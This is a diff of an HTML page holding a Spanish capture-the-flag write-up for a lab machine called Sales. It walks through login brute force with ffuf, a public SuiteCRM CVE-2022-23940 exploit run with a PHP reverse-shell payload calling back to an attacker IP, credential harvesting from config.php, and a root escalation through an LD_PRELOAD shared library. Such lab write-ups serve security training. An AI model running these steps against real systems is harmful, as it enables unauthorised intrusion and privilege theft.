@@ -53,7 +53,7 @@
         },
         "datePublished": "2025-06-06",
         "description": "Writeup Sales🟢",
-        "wordCount":  853 ,
+        "wordCount":  851 ,
         "mainEntityOfPage": "True",
         "dateModified": "2025-06-06",
         "image": {
@@ -219,36 +219,36 @@ stroke-linejoin="round" class="feather feather-home">
 <p>Se detecta un servidor web accesible desde el puerto 80.</p>
 <p><img src="/../machines/nyx/sales/http.webp" alt="http"></p>
 <p>Para facilitar el acceso por nombre de dominio, se añade una entrada al archivo <code>/etc/hosts</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ <span class="nb">echo</span> <span class="s2">&#34;172.0.100.21 sales.nyx&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">echo</span> <span class="s">&#34;172.0.100.21 sales.nyx&#34;</span> <span class="o">|</span> <span class="n">sudo</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 </span></span></code></pre></div><p>Una vez configurado, se accede a <code>http://sales.nyx</code> y se identifica un posible nombre de usuario expuesto en la interfaz web: <strong><code>yuna.yoon</code></strong>.</p>
 <p><img src="/../machines/nyx/sales/sales.webp" alt="sales"></p>
 <h3 id="-enumeración-de-subdominios-virtual-host-fuzzing">🌐 Enumeración de Subdominios (Virtual Host Fuzzing)</h3>
 <p>Dado que no se encuentra funcionalidad sensible en el dominio principal, se realiza fuzzing de subdominios utilizando <code>ffuf</code> con un encabezado personalizado <code>Host</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ffuf -t <span class="m">100</span> -c -fw <span class="m">20</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Host: FUZZ.sales.nyx&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>-u http://sales.nyx
-</span></span></code></pre></div><h4 id="resultados-relevantes">Resultados relevantes:</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www                     <span class="o">[</span>Status: 200<span class="o">]</span>
-</span></span><span class="line"><span class="cl">crm                     <span class="o">[</span>Status: 301<span class="o">]</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">fw</span> <span class="mi">20</span> \
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> \
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">H</span> <span class="s">&#34;Host: FUZZ.sales.nyx&#34;</span> \
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">u</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//sales.nyx
+</span></span></span></code></pre></div><h4 id="resultados-relevantes">Resultados relevantes:</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">www</span>                     <span class="p">[</span><span class="nl">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">crm</span>                     <span class="p">[</span><span class="nl">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">]</span>
 </span></span></code></pre></div><p>Se añade el nuevo subdominio al archivo <code>/etc/hosts</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ <span class="nb">echo</span> <span class="s2">&#34;172.0.100.21 crm.sales.nyx&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">echo</span> <span class="s">&#34;172.0.100.21 crm.sales.nyx&#34;</span> <span class="o">|</span> <span class="n">sudo</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 </span></span></code></pre></div><h4 id="-acceso-al-panel-de-login--crmsalesnyx">🔐 Acceso al Panel de Login – <code>crm.sales.nyx</code></h4>
 <p>Al visitar <code>http://crm.sales.nyx</code>, se encuentra un <strong>panel de autenticación</strong>, lo que sugiere la posibilidad de realizar ataques por fuerza bruta sobre el login.</p>
 <p><img src="/../machines/nyx/sales/crm.webp" alt="crm"></p>
 <h2 id="-generación-de-wordlist-personalizada">🧰 Generación de Wordlist Personalizada</h2>
 <p>Se utiliza <code>cewl</code> para generar un diccionario personalizado a partir del contenido del sitio principal:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cewl  http://sales.nyx -w passwords.txt
-</span></span></code></pre></div><h2 id="-fuerza-bruta-de-credenciales">🔓 Fuerza Bruta de Credenciales</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">cewl</span>  <span class="nl">http</span><span class="p">:</span><span class="c1">//sales.nyx -w passwords.txt
+</span></span></span></code></pre></div><h2 id="-fuerza-bruta-de-credenciales">🔓 Fuerza Bruta de Credenciales</h2>
 <p>Se lanza un ataque de fuerza bruta con <code>ffuf</code>, apuntando al formulario de login de <code>crm.sales.nyx</code> utilizando el usuario previamente identificado <code>yuna.yoon</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ffuf -r -fs <span class="m">11571</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>-w passwords.txt:FUZZ <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>-u <span class="s2">&#34;http://crm.sales.nyx/index.php&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>-d <span class="s2">&#34;module=Users&amp;action=Authenticate&amp;return_module=Users&amp;return_action=Login&amp;cant_login=&amp;login_module=&amp;login_action=&amp;login_record=&amp;login_token=&amp;login_oauth_token=&amp;login_mobile=&amp;user_name=yuna.yoon&amp;username_password=FUZZ&amp;Login=Log+In&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>-H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">fs</span> <span class="mi">11571</span> \
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">w</span> <span class="n">passwords</span><span class="p">.</span><span class="nl">txt</span><span class="p">:</span><span class="n">FUZZ</span> \
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">u</span> <span class="s">&#34;http://crm.sales.nyx/index.php&#34;</span> \
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">d</span> <span class="s">&#34;module=Users&amp;action=Authenticate&amp;return_module=Users&amp;return_action=Login&amp;cant_login=&amp;login_module=&amp;login_action=&amp;login_record=&amp;login_token=&amp;login_oauth_token=&amp;login_mobile=&amp;user_name=yuna.yoon&amp;username_password=FUZZ&amp;Login=Log+In&#34;</span> \
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">H</span> <span class="s">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span>
 </span></span></code></pre></div><h4 id="credenciales-válidas-encontradas">Credenciales válidas encontradas:</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Usuario: yuna.yoon  
-</span></span><span class="line"><span class="cl">Contraseña: ***********
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">Usuario</span><span class="p">:</span> <span class="n">yuna</span><span class="p">.</span><span class="n">yoon</span>  
+</span></span><span class="line"><span class="cl"><span class="nl">Contraseña</span><span class="p">:</span> <span class="o">***********</span>
 </span></span></code></pre></div><h2 id="-acceso-a-suitecrm">⚙️ Acceso a SuiteCRM</h2>
 <p>Tras autenticarse exitosamente con las credenciales válidas, el sistema redirige al <strong>asistente de configuración de SuiteCRM</strong>.</p>
 <p><img src="/../machines/nyx/sales/welcome.webp" alt="welcome"></p>
@@ -266,46 +266,45 @@ stroke-linejoin="round" class="feather feather-home">
 </ul>
 <p><img src="/../machines/nyx/sales/searchExploit.webp" alt="searchExploit"></p>
 <p>Se descarga el repositorio que contiene el <strong>exploit</strong>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">git clone https://github.com/manuelz120/CVE-2022-23940.git
-</span></span></code></pre></div><h2 id="-ejecución-del-exploit--rce-autenticado">💥 Ejecución del Exploit – RCE Autenticado</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">git</span> <span class="n">clone</span> <span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/manuelz120/CVE-2022-23940.git
+</span></span></span></code></pre></div><h2 id="-ejecución-del-exploit--rce-autenticado">💥 Ejecución del Exploit – RCE Autenticado</h2>
 <p>Se lanza el <strong>exploit</strong> autenticado utilizando las credenciales previamente obtenidas, especificando un payload de reverse shell en <strong>PHP</strong>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">python3 exploit.py -h http://crm.sales.nyx -u yuna.yoon -p *********** --payload &#34;php -r &#39;\$sock=fsockopen(\&#34;172.0.100.25\&#34;, 4444); exec(\&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;
-</span></span></code></pre></div><p>Se establece exitosamente una <strong>reverse shell</strong> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">exploit</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//crm.sales.nyx -u yuna.yoon -p *********** --payload &#34;php -r &#39;\$sock=fsockopen(\&#34;172.0.100.25\&#34;, 4444); exec(\&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;
+</span></span></span></code></pre></div><p>Se establece exitosamente una <strong>reverse shell</strong> .</p>
 <p><img src="/../machines/nyx/sales/www-data-shell.webp" alt="www-data-shell"></p>
 <h2 id="-post-explotación--shell-estable-e-interacción-mejorada">🧪 Post-Explotación – Shell Estable e Interacción Mejorada</h2>
 <p>Una vez establecida la <strong>reverse shell</strong>, se realiza el tratamiento de <code>TTY</code> para mejorar la experiencia de uso interactivo dentro del sistema remoto:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
-</span></span><span class="line"><span class="cl"><span class="c1"># Luego</span>
-</span></span><span class="line"><span class="cl">CTRL+Z
-</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-</span></span><span class="line"><span class="cl">reset
-</span></span><span class="line"><span class="cl">xterm
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color 
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
-</span></span><span class="line"><span class="cl"><span class="nb">source</span> /etc/skel/.bashrc
-</span></span><span class="line"><span class="cl">stty rows <span class="m">48</span> cols <span class="m">200</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">CTRL</span><span class="o">+</span><span class="n">Z</span>
+</span></span><span class="line"><span class="cl"><span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span> <span class="n">fg</span>
+</span></span><span class="line"><span class="cl"><span class="n">reset</span>
+</span></span><span class="line"><span class="cl"><span class="n">xterm</span>
+</span></span><span class="line"><span class="cl"><span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span><span class="o">-</span><span class="mi">256</span><span class="n">color</span> 
+</span></span><span class="line"><span class="cl"><span class="n">export</span> <span class="n">SHELL</span><span class="o">=</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">source</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">skel</span><span class="o">/</span><span class="p">.</span><span class="n">bashrc</span>
+</span></span><span class="line"><span class="cl"><span class="n">stty</span> <span class="n">rows</span> <span class="mi">48</span> <span class="n">cols</span> <span class="mi">200</span>
 </span></span></code></pre></div><h2 id="-enumeración-de-usuarios-en-el-sistema">🔍 Enumeración de Usuarios en el Sistema</h2>
 <p>Se identifica al usuario <strong><code>eve</code></strong> como un posible objetivo para escalada lateral.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@template:/var/www/suitecrm$ cat /etc/passwd | grep bash
-</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
-</span></span><span class="line"><span class="cl">eve:x:1001:1001::/home/eve:/bin/bash
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="nl">template</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">suitecrm</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="nl">root</span><span class="p">:</span><span class="nl">x</span><span class="p">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="nl">root</span><span class="p">:</span><span class="o">/</span><span class="nl">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="nl">eve</span><span class="p">:</span><span class="nl">x</span><span class="p">:</span><span class="mi">1001</span><span class="o">:</span><span class="mi">1001</span><span class="o">::/</span><span class="n">home</span><span class="o">/</span><span class="nl">eve</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
 </span></span></code></pre></div><h2 id="-revisión-de-credenciales-en-archivos-del-sistema">🔍 Revisión de Credenciales en Archivos del Sistema</h2>
 <p>Se inspecciona el archivo <code>config.php</code> de la instalación de SuiteCRM, el cual se encuentra en <code>/var/www/suitecrm</code>. Este archivo contiene la configuración de conexión a base de datos, incluyendo contraseñas sensibles:</p>
 <p><img src="/../machines/nyx/sales/grepPassword.webp" alt="grepPassword"></p>
 <h2 id="-escalada-lateral--pivoting-a-usuario-eve">🔁 Escalada Lateral – Pivoting a Usuario <code>eve</code></h2>
 <p>Se intenta cambiar al usuario <code>eve</code> utilizando la contraseña obtenida previamente desde el archivo <code>config.php</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@template:/var/www/suitecrm$ su eve
-</span></span><span class="line"><span class="cl">Password: 
-</span></span><span class="line"><span class="cl">eve@template:/var/www/suitecrm$ id
-</span></span><span class="line"><span class="cl">uid=1001(eve) gid=1001(eve) groups=1001(eve)
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="nl">template</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">suitecrm</span><span class="err">$</span> <span class="n">su</span> <span class="n">eve</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Password</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">eve</span><span class="err">@</span><span class="nl">template</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">suitecrm</span><span class="err">$</span> <span class="n">id</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">eve</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">eve</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">eve</span><span class="p">)</span>
 </span></span></code></pre></div><h2 id="enumeración-de-privilegios--sudo">Enumeración de Privilegios – <code>sudo</code></h2>
 <p>El binario <code>ping</code> puede ser ejecutado como <strong>root sin contraseña</strong>, lo cual representa una potencial vía de escalada de privilegios, especialmente al estar en combinación con la variable de entorno <code>LD_PRELOAD</code> permitida.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">eve@template:~$ sudo -l
-</span></span><span class="line"><span class="cl">Matching Defaults entries for eve on template:
-</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">eve</span><span class="err">@</span><span class="nl">template</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+</span></span><span class="line"><span class="cl"><span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">eve</span> <span class="n">on</span> <span class="nl">template</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span> <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">bin</span><span class="p">,</span> <span class="n">env_keep</span><span class="o">+=</span><span class="n">LD_PRELOAD</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">User eve may run the following commands on template:
-</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /bin/ping
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">eve</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="nl">template</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="nl">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ping</span>
 </span></span></code></pre></div><h2 id="-escalada-a-root-mediante-ld_preload">🚀 Escalada a Root mediante LD_PRELOAD</h2>
 <p>Se verifica en <a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRE#ld_preload--ld_library_path">HackTricks</a> que <code>LD_PRELOAD</code> puede utilizarse para cargar una biblioteca compartida maliciosa al ejecutar binarios como <strong>root</strong>. Se crea un <strong>payload</strong> en <strong>C</strong> para ganar acceso privilegiado:</p>
 <h3 id="código-del-exploit">Código del exploit:</h3>
@@ -320,10 +319,10 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h4 id="compilación-del-payload">Compilación del payload:</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /tmp
-</span></span><span class="line"><span class="cl">gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="n">tmp</span>
+</span></span><span class="line"><span class="cl"><span class="n">gcc</span> <span class="o">-</span><span class="n">fPIC</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">o</span> <span class="n">pe</span><span class="p">.</span><span class="n">so</span> <span class="n">pe</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">nostartfiles</span>
 </span></span></code></pre></div><h4 id="ejecución-con-escalada-de-privilegios">Ejecución con escalada de privilegios:</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo <span class="nv">LD_PRELOAD</span><span class="o">=</span>./pe.so /bin/ping
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">LD_PRELOAD</span><span class="o">=</span><span class="p">.</span><span class="o">/</span><span class="n">pe</span><span class="p">.</span><span class="n">so</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ping</span>
 </span></span></code></pre></div><h2 id="acceso-root">Acceso Root</h2>
 <p>El payload se ejecuta correctamente, y se obtiene una shell con privilegios de <strong>root</strong>, completando así la escalada de privilegios total en la máquina:</p>
 <p><img src="/../machines/nyx/sales/root.webp" alt="root"></p>
